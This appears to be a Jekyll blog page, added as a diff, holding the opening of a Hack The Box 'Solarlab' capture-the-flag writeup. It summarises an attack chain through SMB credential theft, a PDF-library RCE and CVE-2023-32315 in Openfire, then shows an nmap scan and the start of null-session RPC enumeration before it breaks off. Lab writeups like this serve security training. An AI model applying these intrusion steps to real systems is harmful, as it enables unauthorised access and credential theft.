@@ -1,0 +1,2237 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Solarlab writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Solarlab writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Solarlab is a windows machine that requires few steps to complete. First, I will extract passwords from a spreadsheet in the smb service of the victim. Then, I will use those usernames and passwords to bruteforce a web panel and have access to the report page. Inspecting the pdf generated in a report, I can see that its generated using “ReportHub pdf library”, which has a RCE vulnerability that gives me access as blake. Then, I will abuse CVE-2023-32315 to abuse an openfire instance that gives me access as openfire user. From openfire user, I can read the initialize script of the database to have the necessary things to decrypt the password which is reused for Administrator in the system." />
+<meta property="og:description" content="Solarlab is a windows machine that requires few steps to complete. First, I will extract passwords from a spreadsheet in the smb service of the victim. Then, I will use those usernames and passwords to bruteforce a web panel and have access to the report page. Inspecting the pdf generated in a report, I can see that its generated using “ReportHub pdf library”, which has a RCE vulnerability that gives me access as blake. Then, I will abuse CVE-2023-32315 to abuse an openfire instance that gives me access as openfire user. From openfire user, I can read the initialize script of the database to have the necessary things to decrypt the password which is reused for Administrator in the system." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Solarlab.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Solarlab.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-09-21T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Solarlab writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-09-21T00:00:00+02:00","datePublished":"2024-09-21T00:00:00+02:00","description":"Solarlab is a windows machine that requires few steps to complete. First, I will extract passwords from a spreadsheet in the smb service of the victim. Then, I will use those usernames and passwords to bruteforce a web panel and have access to the report page. Inspecting the pdf generated in a report, I can see that its generated using “ReportHub pdf library”, which has a RCE vulnerability that gives me access as blake. Then, I will abuse CVE-2023-32315 to abuse an openfire instance that gives me access as openfire user. From openfire user, I can read the initialize script of the database to have the necessary things to decrypt the password which is reused for Administrator in the system.","headline":"HTB Solarlab writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Solarlab.html"},"url":"http://localhost:4000/writeups/HTB/Solarlab.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Solarlab writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+
+<p>Solarlab is a windows machine that requires few steps to complete. First, I will extract passwords from a spreadsheet in the smb service of the victim. Then, I will use those usernames and passwords to have access to the report page. Inspecting the pdf generated in a report, I can see that its generated using “ReportHub pdf library”, which has a RCE vulnerability that gives me access as blake. Then, I will abuse <a href="https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce">CVE-2023-32315</a> to abuse an openfire instance that gives me access as openfire user. From <code>openfire</code> user, I can read the initialize script of the database to have the necessary things to decrypt the password which is reused for Administrator in the system.</p>
+    
+      <h1 id="ports-recognaissance">
+        
+        
+          Ports recognaissance <a href="#ports-recognaissance" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<pre><code class="language-bash">❯ sudo nmap -p- -sS --open --min-rate 5000 -v -n -Pn -sVC 10.10.11.16 -oA solarlab
+&lt;..SNIP..&gt;
+</code></pre>
+
+<pre><code class="language-bash">❯ cat solarlab.nmap
+# Nmap 7.94SVN scan initiated Sat Sep 21 09:56:37 2024 as: nmap -sS -p- --open --min-rate 5000 -v -n -Pn -sVC -oA solarlab 10.10.11.16
+Nmap scan report for 10.10.11.16
+Host is up (0.061s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          nginx 1.24.0
+|_http-title: Did not follow redirect to http://solarlab.htb/
+|_http-server-header: nginx/1.24.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+6791/tcp open  http          nginx 1.24.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.24.0
+|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-09-21T08:12:11
+|_  start_date: N/A
+|_clock-skew: 14m49s
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Sep 21 09:57:58 2024 -- 1 IP address (1 host up) scanned in 80.96 seconds
+
+</code></pre>
+
+<ul>
+  <li><code>-sVC</code>: Identifies service and version.</li>
+  <li><code>-p-</code>: scans all the range of ports (1-65535).</li>
+  <li><code>--open</code>: shows only open ports and not filtered or closed.</li>
+  <li><code>-sS</code>: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li><code>--min-rate 5000</code>: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
+  <li><code>-n</code>: Disables DNS resolution protocol.</li>
+  <li><code>-v</code>: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li><code>-Pn</code>: Disables host discovery protocol (ping).</li>
+  <li><code>-oA solarlab</code>: Exports the evidence to multiple files in different formats.</li>
+</ul>
+
+<p>There, I identified 4 ports which I classified like this:</p>
+
+<p><strong>WEB</strong>:</p>
+<ul>
+  <li>Port 80: HTTP, using nginx 1.24.0 and it redirects to solarlab.htb, which I need to add to my /etc/hosts file, which in linux is designed for my system to know where should solve that IP:
+    <pre><code class="language-bash">❯ sudo vi /etc/hosts
+10.10.11.16 solarlab.htb
+</code></pre>
+  </li>
+  <li>Port 6791: HTTP, using nginx 1.24.0 and it redirects to <code>report.solarlab.htb:6791</code>, so I will add that subdomain also to my /etc/hosts, with the last line remaining like this:
+    <pre><code class="language-bash">10.10.11.16 solarlab.htb report.solarlab.htb
+</code></pre>
+  </li>
+</ul>
+
+<p><strong>Active directory</strong>:</p>
+<ul>
+  <li>Port 135: RPC, used for active directory staff.</li>
+  <li>Port 139 and 445: Used for SMB to share files between systems.</li>
+</ul>
+
+<p>I will proceed to enumerate those.</p>
+    
+      <h1 id="active-directory">
+        
+        
+          Active directory <a href="#active-directory" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="rpc">
+        
+        
+          RPC <a href="#rpc" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I will try null and guest sessions to see if I can access without credentials and retrieve relevant information like usernames and domain info:</p>
+
+<pre><code class="language-bash"># Null session
+❯ rpcclient -N 10.10.11.16
